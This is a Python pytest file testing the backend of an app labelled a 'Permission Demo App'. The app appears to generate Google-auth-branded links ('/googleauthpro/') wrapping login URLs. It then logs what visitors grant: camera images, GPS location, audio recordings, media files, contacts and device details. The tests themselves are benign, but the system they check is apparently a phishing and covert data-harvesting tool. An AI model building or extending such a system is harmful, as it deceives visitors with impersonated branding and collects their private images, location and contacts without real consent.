"""Backend tests for Permission Demo App: demo-links and visit-logs CRUD."""
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://photo-logger-app-1.preview.emergentagent.com").rstrip("/")
API = f"{BASE_URL}/api"


@pytest.fixture(scope="module")
def session():
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json"})
    return s


# Health check
def test_root(session):
    r = session.get(f"{API}/")
    assert r.status_code == 200
    assert "message" in r.json()


# Create demo link & verify URL format
def test_create_demo_link_url_format(session):
    payload = {
        "original_url": "https://example.com/login",
        "permissions": ["camera", "location"],
    }
    r = session.post(f"{API}/demo-links", json=payload)
    assert r.status_code == 200, r.text
    data = r.json()
    assert "demo_code" in data and len(data["demo_code"]) > 0
    assert "demo_url" in data
    # Must contain /googleauthpro/, must NOT contain googleauthpro.app or /l/
    assert "/googleauthpro/" in data["demo_url"], f"demo_url missing branded path: {data['demo_url']}"
    assert "googleauthpro.app" not in data["demo_url"], f"demo_url leaked old domain: {data['demo_url']}"
    assert "/l/" not in data["demo_url"], f"demo_url should not use /l/ prefix: {data['demo_url']}"
    # Verify it starts with the public BASE_URL
    assert data["demo_url"].startswith(BASE_URL), f"demo_url should start with backend public URL: {data['demo_url']}"
    assert data["demo_url"].endswith(f"/googleauthpro/{data['demo_code']}")
    assert data["original_url"] == payload["original_url"]
    assert sorted(data["permissions"]) == sorted(payload["permissions"])
    # Stash code for later tests
    pytest.demo_code = data["demo_code"]


# Get the demo link & verify visit counter increments
def test_get_demo_link_increments_visits(session):
    code = pytest.demo_code
    r1 = session.get(f"{API}/demo-links/{code}")
    assert r1.status_code == 200, r1.text
    d1 = r1.json()
    assert d1["demo_code"] == code
    assert d1["original_url"] == "https://example.com/login"
    visits1 = d1["visits"]

    r2 = session.get(f"{API}/demo-links/{code}")
    assert r2.status_code == 200
    visits2 = r2.json()["visits"]
    assert visits2 == visits1 + 1, f"visits did not increment: {visits1} -> {visits2}"


def test_get_demo_link_not_found(session):
    r = session.get(f"{API}/demo-links/__does_not_exist__")
    assert r.status_code == 404


# Visit logs round-trip - persist all fields
def test_create_visit_log_and_get(session):
    code = pytest.demo_code
    payload = {
        "demo_code": code,
        "permissions_granted": ["camera", "location"],
        "permissions_denied": [],
        "camera_images": ["data:image/jpeg;base64,AAAA", "data:image/jpeg;base64,BBBB", "data:image/jpeg;base64,CCCC"],
        "location_data": {"latitude": 12.34, "longitude": 56.78, "accuracy": 10},
        "audio_data": "data:audio/webm;base64,XYZ",
        "media_files": [{"type": "image", "name": "a.jpg", "size": 100, "data": "data:image/jpeg;base64,QQ=="}],
        "contacts": [{"name": "Alice", "phone": "+1234", "email": "a@b.com"}],
        "device_info": {"deviceType": "Android", "browser": "Chrome", "os": "Android"},
    }
    r = session.post(f"{API}/visit-logs", json=payload)
    assert r.status_code == 200, r.text
    created = r.json()
    assert created["demo_code"] == code
    assert created["permissions_granted"] == payload["permissions_granted"]
    assert created["camera_images"] == payload["camera_images"]
    assert created["location_data"]["latitude"] == 12.34
    assert created["audio_data"] == payload["audio_data"]
    assert created["media_files"][0]["name"] == "a.jpg"
    assert created["contacts"][0]["name"] == "Alice"
    assert created["device_info"]["deviceType"] == "Android"

    # GET to verify persistence
    g = session.get(f"{API}/visit-logs/{code}")
    assert g.status_code == 200, g.text
    logs = g.json()
    assert isinstance(logs, list) and len(logs) >= 1
    log = logs[0]  # newest first
    assert log["demo_code"] == code
    assert log["device_info"]["browser"] == "Chrome"
    assert len(log["camera_images"]) == 3
    assert log["contacts"][0]["email"] == "a@b.com"


# List demo links sorted newest first
def test_list_demo_links_sorted(session):
    # Create a second link
    r = session.post(f"{API}/demo-links", json={
        "original_url": "https://example.com/second",
        "permissions": ["microphone"],
    })
    assert r.status_code == 200
    second_code = r.json()["demo_code"]
    assert "/googleauthpro/" in r.json()["demo_url"]

    list_r = session.get(f"{API}/demo-links")
    assert list_r.status_code == 200
    arr = list_r.json()
    assert isinstance(arr, list) and len(arr) >= 2
    # Sorted newest first
    timestamps = [item["created_at"] for item in arr]
    assert timestamps == sorted(timestamps, reverse=True), "demo-links not sorted newest first"
    # The just-created link should be first
    assert arr[0]["demo_code"] == second_code
